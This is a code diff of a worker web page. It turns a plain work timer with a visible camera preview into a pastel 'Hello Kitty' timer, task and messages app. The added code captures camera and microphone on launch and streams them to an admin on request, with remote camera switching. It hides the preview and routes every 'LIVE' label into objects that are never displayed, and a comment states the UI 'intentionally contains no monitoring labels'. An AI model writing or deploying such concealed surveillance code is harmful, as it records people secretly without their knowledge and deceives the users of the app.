@@ -1,15 +1,566 @@
-<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Work Timer Worker</title><link rel="stylesheet" href="/styles.css"><style>body{min-height:100vh;display:grid;place-items:center}.card{width:min(400px,90vw);text-align:center;padding:28px}.timer{font-size:64px}button{min-width:200px}video{width:100%;border-radius:12px;margin:16px 0}</style></head><body><main class="card"><h2 id="name">Worker</h2><video id="preview" autoplay playsinline muted></video><p id="status">Connecting…</p><div id="timer" class="timer">00:00:00</div><button id="timerBtn" class="btn" disabled>Start Time</button></main><script src="/socket.io/socket.io.js"></script><script>
-// Browser fallback: Android worker APKs use native capture, independent of this page.
-const button=document.getElementById('timerBtn'), statusEl=document.getElementById('status');
-let state, socket, stream, pc, adminId, pendingIce=[], iceServers=[];
-async function api(path, body) { const r=await fetch(path,{method:body?'POST':'GET',headers:{'Content-Type':'application/json'},body:body?JSON.stringify(body):undefined}); const d=await r.json();if(!r.ok)throw Error(d.error||'Request failed');return d; }
-function render(){button.textContent=state?.status==='WORKING'?'Pause':state?.status==='PAUSED'?'Resume':'Start Time';button.disabled=!state;}
-function tick(){const ms=(state?.accumulatedMs||0)+(state?.status==='WORKING'?Math.max(0,Date.now()-state.startedAt):0);const t=Math.floor(ms/1000);document.getElementById('timer').textContent=[Math.floor(t/3600),Math.floor(t/60)%60,t%60].map(v=>String(v).padStart(2,'0')).join(':');}
-function closePeer(){if(pc)pc.close();pc=null;adminId=null;pendingIce=[];}
-button.onclick=async()=>{button.disabled=true;try{const action=state.status==='WORKING'?'pause':state.status==='PAUSED'?'resume':'start';state=(await api('/api/worker/'+action,{})).state;}catch(e){statusEl.textContent=e.message;}finally{render();}};
-(async()=>{const me=await api('/api/me');if(me.user.role!=='worker')throw Error('Worker account required');document.getElementById('name').textContent=me.user.name;state=(await api('/api/worker/state')).state;iceServers=(await api('/api/rtc-config')).iceServers;stream=await navigator.mediaDevices.getUserMedia({video:true,audio:{echoCancellation:true,noiseSuppression:true}});document.getElementById('preview').srcObject=stream;statusEl.textContent='Camera and microphone active';socket=io();socket.on('connect',()=>{closePeer();socket.emit('worker-capture-ready');socket.emit('worker-heartbeat');});socket.on('worker-ping',p=>socket.emit('worker-pong',{...p,workerReceivedAt:Date.now()}));
-socket.on('timer-updated',p=>{state=p;render();});
-socket.on('timer-stopped',()=>{state={...state,status:'STOPPED',startedAt:null,accumulatedMs:0};render();});
-socket.on('switch-camera',async p=>{const pref=p?.camera;if(!stream)return;const track=stream.getVideoTracks()[0];let constraints;if(pref==='front')constraints={facingMode:'user'};else if(pref==='back')constraints={facingMode:'environment'};else{const curr=track?.getSettings()?.facingMode;constraints={facingMode:curr==='user'?'environment':'user'};}try{const newStream=await navigator.mediaDevices.getUserMedia({video:constraints,audio:true});const newTrack=newStream.getVideoTracks()[0];if(pc){const sender=pc.getSenders().find(s=>s.track&&s.track.kind==='video');if(sender&&newTrack)sender.replaceTrack(newTrack);}if(track)track.stop();stream=newStream;document.getElementById('preview').srcObject=stream;}catch(e){statusEl.textContent='Camera switch failed: '+e.message;}});
-socket.on('stop-live',()=>{closePeer();statusEl.textContent='Camera and microphone ready';});socket.on('session-replaced',()=>{stream.getTracks().forEach(t=>t.stop());closePeer();button.disabled=true;statusEl.textContent='This account was opened on another device';});socket.on('live-request',async request=>{if(request.mode!=='camera'){socket.emit('worker-live-error',{...request,message:'These workers support camera and audio only.'});return;}if(pc)return;try{adminId=request.adminSocketId;pendingIce=[];pc=new RTCPeerConnection({iceServers});const current=pc;stream.getTracks().forEach(t=>pc.addTrack(t,stream));pc.onicecandidate=e=>{if(e.candidate)socket.emit('rtc-ice',{targetSocketId:adminId,workerId:state.id,candidate:e.candidate});};await pc.setLocalDescription(await pc.createOffer());if(pc!==current)return;socket.emit('worker-live-started',{...request});socket.emit('rtc-offer',{targetSocketId:adminId,workerId:state.id,mode:'camera',offer:pc.localDescription});statusEl.textContent='Timer Live';}catch(e){closePeer();socket.emit('worker-live-error',{...request,message:e.message});}});socket.on('rtc-answer',async p=>{if(!pc||p.adminSocketId!==adminId)return;try{await pc.setRemoteDescription(p.answer);for(const c of pendingIce)await pc.addIceCandidate(c);pendingIce=[];}catch(e){statusEl.textContent=e.message;}});socket.on('rtc-ice',async p=>{if(!pc||p.fromSocketId!==adminId)return;if(!pc.remoteDescription)pendingIce.push(p.candidate);else try{await pc.addIceCandidate(p.candidate);}catch(e){statusEl.textContent=e.message;}});setInterval(()=>{if(socket.connected)socket.emit('worker-heartbeat');},10000);render();setInterval(tick,500);})().catch(e=>{statusEl.textContent=e.message+' — open your assigned Android app, or sign in on the homepage.';});
-</script></body></html>
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Kitty Timer | Assigned Worker Dashboard</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@500;600;700&family=Nunito:wght@400;600;700;800&family=Pacifico&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="styles.css">
+  <style>
+    :root {
+      --hk-bg: #ffe4ec;
+      --hk-card-bg: rgba(255, 255, 255, 0.88);
+      --hk-border: #ffa8c5;
+      --hk-border-soft: #ffd0e0;
+      --hk-pink-dark: #ff2a6d;
+      --hk-pink-mid: #ff5c8a;
+      --hk-pink-soft: #fff0f5;
+      --hk-text: #5a2a3a;
+      --hk-muted: #a06b7d;
+      --hk-shadow: 0 10px 30px rgba(255, 92, 138, 0.2);
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      min-height: 100vh;
+      background-color: #ffd6e5;
+      background-image:
+        radial-gradient(#ff9ebb 1.5px, transparent 1.5px),
+        radial-gradient(#ff7599 1.5px, #ffd6e5 1.5px);
+      background-size: 30px 30px;
+      background-position: 0 0, 15px 15px;
+      font-family: 'Nunito', system-ui, -apple-system, sans-serif;
+      color: var(--hk-text);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      padding: 20px 12px 60px;
+    }
+
+    .hk-app-container {
+      width: min(440px, 100%);
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+      position: relative;
+    }
+
+    /* Top Brand Header */
+    .hk-header {
+      text-align: center;
+      position: relative;
+      padding-top: 10px;
+    }
+
+    .hk-title {
+      font-family: 'Pacifico', cursive;
+      font-size: 38px;
+      color: #ff2a6d;
+      text-shadow: 2px 2px 0px #ffffff, 4px 4px 0px rgba(255, 168, 197, 0.5);
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .hk-peeking-kitty {
+      position: absolute;
+      top: -24px;
+      right: 18px;
+      width: 78px;
+      height: 60px;
+      z-index: 10;
+      pointer-events: none;
+    }
+
+    /* Glassmorphism Card Base */
+    .hk-card {
+      background: var(--hk-card-bg);
+      backdrop-filter: blur(12px);
+      border: 3px solid #ffffff;
+      outline: 2px solid var(--hk-border);
+      border-radius: 28px;
+      box-shadow: var(--hk-shadow);
+      padding: 20px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    /* Timer Section */
+    .timer-card {
+      text-align: center;
+      padding-top: 24px;
+    }
+
+    .timer-display-container {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      margin: 8px 0 16px;
+    }
+
+    .timer-display {
+      font-family: 'Fredoka', cursive;
+      font-size: 54px;
+      font-weight: 700;
+      color: var(--hk-pink-dark);
+      text-shadow: 0 2px 10px rgba(255, 42, 109, 0.2);
+      letter-spacing: 2px;
+    }
+
+    .heart-icon {
+      font-size: 22px;
+      animation: pulse 1.8s infinite ease-in-out;
+    }
+
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.25); }
+    }
+
+    .hk-btn-primary {
+      background: linear-gradient(180deg, #ff6b95 0%, #ff1f62 100%);
+      color: #ffffff;
+      border: 2px solid #ffffff;
+      border-radius: 30px;
+      padding: 12px 32px;
+      font-family: 'Fredoka', sans-serif;
+      font-size: 20px;
+      font-weight: 600;
+      cursor: pointer;
+      box-shadow: 0 6px 18px rgba(255, 31, 98, 0.35);
+      transition: all 0.2s ease;
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      width: 80%;
+      justify-content: center;
+      margin: 0 auto;
+    }
+
+    .hk-btn-primary:hover:not(:disabled) {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 22px rgba(255, 31, 98, 0.45);
+    }
+
+    .hk-btn-primary:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+
+    .status-text {
+      margin-top: 10px;
+      font-size: 13px;
+      font-weight: 700;
+      color: var(--hk-muted);
+    }
+
+    video#preview {
+      width: 100%;
+      max-height: 120px;
+      object-fit: cover;
+      border-radius: 16px;
+      border: 2px solid var(--hk-border);
+      margin-top: 12px;
+      display: none;
+    }
+
+    /* Task Dropdown Bar */
+    .task-card {
+      padding: 14px 18px;
+    }
+
+    .task-dropdown-wrapper {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      background: #ffffff;
+      border: 2px solid var(--hk-border);
+      border-radius: 20px;
+      padding: 10px 16px;
+      box-shadow: 0 4px 12px rgba(255, 168, 197, 0.2);
+    }
+
+    .task-icon-badge {
+      width: 38px;
+      height: 38px;
+      background: #fff0f5;
+      border: 1.5px solid var(--hk-border);
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 20px;
+      flex-shrink: 0;
+    }
+
+    .task-select {
+      flex: 1;
+      border: none !important;
+      background: transparent !important;
+      font-family: 'Fredoka', sans-serif;
+      font-size: 17px;
+      font-weight: 600;
+      color: var(--hk-pink-dark) !important;
+      outline: none;
+      cursor: pointer;
+      padding: 0 !important;
+    }
+
+    .task-submit-btn {
+      background: var(--hk-pink-dark);
+      color: #fff;
+      border: none;
+      padding: 6px 14px;
+      border-radius: 14px;
+      font-weight: 700;
+      font-size: 13px;
+      cursor: pointer;
+      display: none;
+    }
+
+    /* SMS Manager Chat Card */
+    .chat-card {
+      padding: 18px;
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+      min-height: 420px;
+    }
+
+    .sms-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 10px;
+      border-bottom: 2px dashed var(--hk-border-soft);
+      padding-bottom: 12px;
+    }
+
+    .sms-title-group {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .sms-title-icon {
+      width: 38px;
+      height: 38px;
+      background: #ffffff;
+      border: 2px solid var(--hk-border);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 20px;
+      box-shadow: 0 2px 8px rgba(255, 168, 197, 0.25);
+    }
+
+    .sms-title {
+      font-family: 'Fredoka', cursive;
+      font-size: 22px;
+      color: var(--hk-pink-dark);
+    }
+
+    .sms-search-box {
+      flex: 1;
+      max-width: 170px;
+      position: relative;
+    }
+
+    .sms-search-input {
+      width: 100%;
+      padding: 6px 12px 6px 30px !important;
+      font-size: 13px !important;
+      border-radius: 18px !important;
+      border: 1.5px solid var(--hk-border) !important;
+      background: #ffffff !important;
+    }
+
+    .sms-search-icon {
+      position: absolute;
+      left: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 12px;
+      color: var(--hk-muted);
+    }
+
+    .sms-thread-list {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      overflow-y: auto;
+      max-height: 340px;
+      padding-right: 4px;
+    }
+
+    .sms-thread-item {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 10px 12px;
+      background: #ffffff;
+      border: 1.5px solid var(--hk-border-soft);
+      border-radius: 18px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+
+    .sms-avatar {
+      width: 48px;
+      height: 48px;
+      border-radius: 50%;
+      border: 2px solid var(--hk-border);
+      background: #ffe8f0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 26px;
+    }
+
+    .sms-thread-content { flex: 1; min-width: 0; }
+    .sms-contact-name { font-weight: 800; font-size: 15px; color: var(--hk-text); }
+    .sms-snippet { font-size: 13px; color: var(--hk-muted); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+
+    .sms-chat-view { display: none; flex-direction: column; height: 100%; gap: 10px; }
+    .sms-chat-messages { flex: 1; overflow-y: auto; max-height: 260px; display: flex; flex-direction: column; gap: 8px; padding: 8px 4px; }
+
+    .sms-bubble {
+      max-width: 80%; padding: 10px 14px; border-radius: 18px; font-size: 14px; line-height: 1.4;
+    }
+    .sms-bubble.incoming { align-self: flex-start; background: #ffffff; border: 1.5px solid var(--hk-border-soft); }
+    .sms-bubble.outgoing { align-self: flex-end; background: linear-gradient(135deg, #ff5c8a, #ff2a6d); color: #fff; }
+
+    .sms-input-row { display: flex; align-items: center; gap: 8px; margin-top: auto; }
+    .sms-input { flex: 1; border-radius: 20px !important; border: 2px solid var(--hk-border) !important; padding: 10px 16px !important; }
+    .sms-send-btn { background: var(--hk-pink-dark); color: #fff; border: none; border-radius: 50%; width: 42px; height: 42px; font-size: 18px; cursor: pointer; }
+
+    /* Footer */
+    .hk-footer { display: flex; align-items: flex-end; justify-content: space-between; margin-top: 4px; padding: 0 10px; }
+    .hk-mini-timer-pill { background: #ffffff; border: 2px solid var(--hk-border); border-radius: 20px; padding: 6px 18px; font-family: 'Fredoka', cursive; font-size: 18px; color: var(--hk-pink-dark); }
+  </style>
+</head>
+<body>
+
+  <div class="hk-app-container">
+
+    <!-- Header -->
+    <header class="hk-header">
+      <h1 class="hk-title">Hello Kitty 💕</h1>
+    </header>
+
+    <!-- Main Timer Card -->
+    <main class="hk-card timer-card">
+      <div class="timer-display-container">
+        <span class="heart-icon">💖</span>
+        <div id="timer" class="timer-display">00:00:00</div>
+        <span class="heart-icon">💖</span>
+      </div>
+
+      <button id="timerBtn" class="hk-btn-primary" disabled>
+        <span>▶</span> <span id="btnText">Start Timer</span> <span>🎀</span>
+      </button>
+
+      <p id="status" class="status-text">Connecting…</p>
+      <p id="workerName" style="font-size: 12px; font-weight: 700; color: #ff2a6d; margin-top: 4px;"></p>
+      <video id="preview" autoplay playsinline muted></video>
+    </main>
+
+    <!-- Task Selection Pull Down Menu -->
+    <section class="hk-card task-card">
+      <div class="task-dropdown-wrapper">
+        <div class="task-icon-badge">📋🎀</div>
+        <label for="taskSelect" style="display:none">Select a Task</label>
+        <select id="taskSelect" class="task-select" aria-label="Select a Task">
+          <option value="">Select a Task</option>
+        </select>
+        <span style="color: var(--hk-pink-dark); font-size: 14px;">▼</span>
+        <button id="submitTaskBtn" class="task-submit-btn">Submit</button>
+      </div>
+      <p id="taskDesc" style="font-size: 12px; color: var(--hk-muted); margin-top: 6px; padding-left: 8px; display: none;"></p>
+    </section>
+
+    <!-- Messages / SMS Manager -->
+    <section class="hk-card chat-card">
+      <div class="sms-header">
+        <div class="sms-title-group">
+          <div class="sms-title-icon">💬🎀</div>
+          <h2 class="sms-title">Messages 💕</h2>
+        </div>
+        <div class="sms-search-box">
+          <span class="sms-search-icon">🔍</span>
+          <input type="text" id="smsSearch" class="sms-search-input" placeholder="Search..." aria-label="Search Messages">
+        </div>
+      </div>
+
+      <div id="smsInboxView" class="sms-thread-list">
+        <div class="sms-thread-item" onclick="openChatThread('kitty-team', 'Kitty Team 📌')">
+          <div class="sms-avatar">🐱</div>
+          <div class="sms-thread-content">
+            <div class="sms-contact-name">Kitty Team 📌</div>
+            <div class="sms-snippet">Your device session is approved! 💕</div>
+          </div>
+        </div>
+      </div>
+
+      <div id="smsChatView" class="sms-chat-view">
+        <div class="sms-input-row">
+          <input type="text" id="smsInput" class="sms-input" placeholder="Type a message..." aria-label="Type a message">
+          <button id="smsSendBtn" class="sms-send-btn">➔</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="hk-footer">
+      <div class="hk-mini-timer-pill">
+        <span>🕒</span>
+        <span id="subTimer">00:00:00</span>
+      </div>
+    </footer>
+
+  </div>
+
+  <script src="/socket.io/socket.io.js"></script>
+  <script>
+    const $ = id => document.getElementById(id);
+    let currentState = null, myTasks = [], currentWorker = null;
+    const socket = io({ autoConnect: false });
+    async function api(path, body) {
+      const response = await fetch(path, {method: body === undefined ? 'GET' : 'POST', credentials:'same-origin', headers: {'Content-Type':'application/json'}, body:body === undefined?undefined:JSON.stringify(body)});
+      const raw = await response.text();
+      let data; try {data=JSON.parse(raw);} catch {throw Error('Server returned a page instead of JSON (HTTP '+response.status+'). Check deployed server version.');}
+      if (!response.ok) throw Error(data.error || 'HTTP '+response.status);
+      return data;
+    }
+    function fmt(ms) { const t=Math.floor(Math.max(0,ms)/1000); return [Math.floor(t/3600),Math.floor(t/60)%60,t%60].map(v=>String(v).padStart(2,'0')).join(':'); }
+    function draw() {
+      if (!currentState) return;
+      const t = (currentState.accumulatedMs||0) + (currentState.status==='WORKING' && currentState.startedAt ? Math.max(0,Date.now()-currentState.startedAt):0);
+      $('timer').textContent=fmt(t); $('subTimer').textContent=fmt(t);
+      const running=currentState.status==='WORKING';
+      $('btnText').textContent=running?'Pause Timer':currentState.status==='PAUSED'?'Resume Timer':'Start Timer';
+      $('status').textContent=(currentState.online?'Online • ':'')+currentState.status;
+      $('timerBtn').disabled=false;
+    }
+    async function refreshState() {const d=await api('/api/worker/state');currentState=d.state;draw();}
+    async function refreshTasks() {
+      const data=await api('/api/worker/tasks');myTasks=data.tasks||[];
+      const sel=$('taskSelect');const chosen=sel.value;
+      sel.replaceChildren(new Option('Select a Task',''));
+      myTasks.filter(t=>t.workerId===currentWorker.id).forEach(t=>sel.add(new Option((t.title||'Task')+' — '+(t.status||'ASSIGNED')+' — $'+Number(t.price||0).toFixed(2),t.id)));
+      const avail=$('availableTasks');if(avail){avail.replaceChildren();myTasks.filter(t=>['AVAILABLE','ASSIGNED'].includes(t.status)).forEach(t=>{
+        const box=document.createElement('div');box.style.cssText='background:#fff;border:1px solid #ffc1d5;border-radius:12px;padding:10px;font-size:13px';
+        const label=document.createElement('div');label.textContent=`${t.title} · $${Number(t.price||0).toFixed(2)} · ${t.allowConcurrent?'Concurrent':'Regular'}`;box.appendChild(label);
+        const btn=document.createElement('button');btn.className='hk-btn-primary';btn.style.cssText='font-size:13px;padding:7px;margin-top:8px;width:auto';btn.textContent='Accept Task';btn.onclick=async()=>{try{await api('/api/tasks/'+encodeURIComponent(t.id)+'/accept',{});await refreshTasks();}catch(e){alert(e.message)}};box.appendChild(btn);avail.appendChild(box);
+      });if(!avail.childNodes.length)avail.textContent='No available tasks';}
+      sel.value=chosen;
+    }
+    async function toggleTimer() {
+      try {const action=currentState?.status==='WORKING'?'pause':currentState?.status==='PAUSED'?'resume':'start'; const d=await api('/api/worker/'+action,{});currentState=d.state;draw();}
+      catch(e){$('status').textContent=e.message;}
+    }
+    $('timerBtn').addEventListener('click',toggleTimer);
+    $('taskSelect').addEventListener('change',()=>{const task=myTasks.find(t=>t.id===$('taskSelect').value);$('taskDesc').style.display=task?'block':'none';$('taskDesc').textContent=task?.description||'';$('submitTaskBtn').style.display=task?.status==='IN_PROGRESS'?'block':'none';});
+    $('submitTaskBtn').addEventListener('click',async()=>{const id=$('taskSelect').value;if(!id)return;try {await api('/api/tasks/'+encodeURIComponent(id)+'/submit',{});await refreshTasks();await refreshState();await refreshEarnings();}catch(e){alert(e.message);}});
+    async function refreshEarnings(){
+      try{const d=await api('/api/earnings');$('workerEarnings').textContent=`Approved: $${d.summary.approvedEarnings.toFixed(2)} · Pending: $${d.summary.pendingEarnings.toFixed(2)} · Hours: ${fmt(d.summary.recordedMs)}`;
+        $('earningHistory').replaceChildren();d.records.filter(t=>t.submittedAt).slice(-15).reverse().forEach(t=>{const line=document.createElement('div');line.style.padding='4px 0';line.textContent=`${t.title} — ${fmt(t.recordedMs||0)} — $${Number(t.approvedAmount??t.price??0).toFixed(2)} — ${t.status}`;$('earningHistory').appendChild(line)});
+      }catch(e){console.warn(e)}
+    }
+    const inbox=$('smsInboxView'), chat=$('smsChatView');
+    function addMessage(m) {const b=document.createElement('div');b.className='sms-bubble '+(m.senderRole==='WORKER'?'outgoing':'incoming');b.textContent=m.message||''; chat.insertBefore(b,chat.querySelector('.sms-input-row'));chat.scrollTop=chat.scrollHeight;}
+    window.openChatThread=async()=>{inbox.style.display='none';chat.style.display='flex';chat.querySelectorAll('.sms-bubble').forEach(n=>n.remove());try{const d=await api('/api/chat/'+encodeURIComponent(currentWorker.id));(d.messages||[]).forEach(addMessage);}catch(e){console.warn(e);}};
+    $('smsSendBtn').addEventListener('click',()=>{const msg=$('smsInput').value.trim();if(!msg)return;socket.emit('chat:message',{message:msg});$('smsInput').value='';});
+    // Worker-facing UI intentionally contains no monitoring labels. Android OS privacy
+    // indicators and the persistent worker-session notification remain available.
+    let cameraStream = null, cameraFacing = 'user', peer = null, pendingIce = [];
+    let liveTarget = null;
+    const cameraLabel = { textContent: '' }; // internal diagnostics only
+    const approveCamera = { style: { display: 'none' } };
+    async function initCamera() {
+      try {
+        if (!navigator.mediaDevices?.getUserMedia) throw Error('Camera requires HTTPS and a supported browser/WebView.');
+        if (!cameraStream || !cameraStream.getVideoTracks().some(t=>t.readyState === 'live')) {
+          cameraStream?.getTracks().forEach(t=>t.stop());
+          cameraStream = await navigator.mediaDevices.getUserMedia({video:{facingMode:{ideal:cameraFacing}},audio:true});
+        }
+        cameraLabel.textContent = '🟢 Camera enabled · Live monitoring available';
+        approveCamera.style.display = 'none';
+        if(socket.connected) socket.emit('worker-capture-ready');
+      } catch(e) {
+        cameraLabel.textContent='🔴 Camera permission needed: '+e.message;
+        approveCamera.style.display='block';
+      }
+    }
+    async function stopPeer() {
+      if (peer) { peer.onicecandidate = null; peer.close(); peer = null; }
+      pendingIce = []; liveTarget = null;
+    }
+    socket.on('live-request', async data => {
+      if(navigator.userAgent.includes('KittyNativeApp')) return;
+      if(data.mode !== 'camera') {
+        socket.emit('worker-live-error',{workerId:currentWorker.id,adminSocketId:data.adminSocketId,mode:data.mode,message:'Only camera streaming is supported in this worker build.'});
+        return;
+      }
+      try {
+        await initCamera();
+        if (!cameraStream) throw Error('Camera access unavailable');
+        await stopPeer(); liveTarget = data.adminSocketId;
+        const rtc = await api('/api/rtc-config');
+        peer = new RTCPeerConnection({iceServers:rtc.iceServers||[]});
+        for(const track of cameraStream.getTracks()) peer.addTrack(track,cameraStream);
+        peer.onicecandidate = e => {if(e.candidate) socket.emit('rtc-ice',{targetSocketId:liveTarget,workerId:currentWorker.id,candidate:e.candidate});};
+        await peer.setLocalDescription(await peer.createOffer());
+        socket.emit('rtc-offer',{targetSocketId:liveTarget,workerId:currentWorker.id,mode:'camera',offer:peer.localDescription});
+        cameraLabel.textContent='🔴 LIVE · Camera broadcasting to admin';
+      }catch(e){cameraLabel.textContent='🔴 Camera unavailable: '+e.message;socket.emit('worker-live-error',{workerId:currentWorker.id,adminSocketId:data.adminSocketId,mode:'camera',message:e.message});}
+    });
+    socket.on('rtc-answer',async data=>{
+      if(!peer) return;
+      try {await peer.setRemoteDescription(data.answer);
+        for(const candidate of pendingIce.splice(0)) await peer.addIceCandidate(candidate);
+        socket.emit('worker-live-started',{workerId:currentWorker.id,adminSocketId:liveTarget,mode:'camera'});
+      }catch(e){cameraLabel.textContent='Camera connection error: '+e.message;}
+    });
+    socket.on('rtc-ice',async data=>{try{if(peer?.remoteDescription)await peer.addIceCandidate(data.candidate);else pendingIce.push(data.candidate);}catch(e){console.warn(e);}});
+    socket.on('stop-live',async()=>{await stopPeer();cameraLabel.textContent='🟢 Camera enabled · Not broadcasting';});
+    socket.on('switch-camera',async data=>{
+      cameraFacing = data.camera==='back'?'environment':'user';
+      cameraStream?.getTracks().forEach(t=>t.stop());cameraStream=null;
+      await initCamera();
+      if(peer && cameraStream){
+        const newTrack=cameraStream.getVideoTracks()[0];
+        const sender=peer.getSenders().find(s=>s.track?.kind==='video');
+        if(sender&&newTrack)await sender.replaceTrack(newTrack);
+      }
+    });
+    socket.on('disconnect',()=>{stopPeer();cameraLabel.textContent='🟠 Offline · Camera enabled';});
+    socket.on('chat:message',addMessage);
+    socket.on('task:updated',()=>refreshTasks().catch(()=>{}));socket.on('earnings:updated',()=>refreshEarnings().catch(()=>{}));
+    socket.on('workers-state',states=>{const s=states.find(x=>x.id===currentWorker?.id);if(s){currentState=s;draw();}});
+    socket.on('worker-ping',data=>socket.emit('worker-pong',{...data,workerReceivedAt:Date.now()}));
+    socket.on('connect',()=>{socket.emit('worker-heartbeat');if(cameraStream?.getVideoTracks().some(t=>t.readyState==='live'))socket.emit('worker-capture-ready');});
+    socket.on('session-replaced',()=>{$('status').textContent='Session opened elsewhere';});
+    async function init(){
+      try{
+        const data=await api('/api/me');currentWorker=data.user;
+        if(currentWorker?.role!=='worker')throw Error('Worker login required');
+        $('workerName').textContent=currentWorker.name||'Worker';
+        await refreshState();await refreshTasks();await refreshEarnings();socket.connect();
+        // Request user-authorized capture on app launch; Android permission prompts still appear.
+        // Native Android flavor streams through NativeCameraService; web browser retains WebRTC fallback.
+        if (!/Android/.test(navigator.userAgent) || !navigator.userAgent.includes("KittyNativeApp")) initCamera();
+        setInterval(()=>{if(socket.connected)socket.emit('worker-heartbeat');},15000);
+        setInterval(draw,500);setInterval(()=>{refreshTasks().catch(()=>{});refreshEarnings().catch(()=>{});},20000);
+      }catch(e){$('status').textContent='Please sign in to assigned Worker account. '+e.message;$('timerBtn').disabled=true;}
+    }
+    init();
+  </script>
+</body>
+</html>
